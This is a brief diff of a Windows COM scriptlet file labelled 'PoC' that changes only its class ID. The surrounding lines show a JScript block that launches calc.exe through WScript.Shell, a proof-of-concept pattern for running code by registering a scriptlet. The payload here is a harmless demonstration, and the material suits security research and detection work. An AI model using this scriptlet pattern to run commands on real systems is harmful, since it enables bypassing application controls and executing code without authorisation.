@@ -2,7 +2,7 @@
 <scriptlet>
 <registration 
     progid="PoC"
-    classid="{F0001111-0000-0000-0000-0000M30WM30W}" >
+    classid="{F0001111-0000-0000-0000-0000MEOWMEOW}" >
 	<script language="JScript">
 		<![CDATA[
 			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
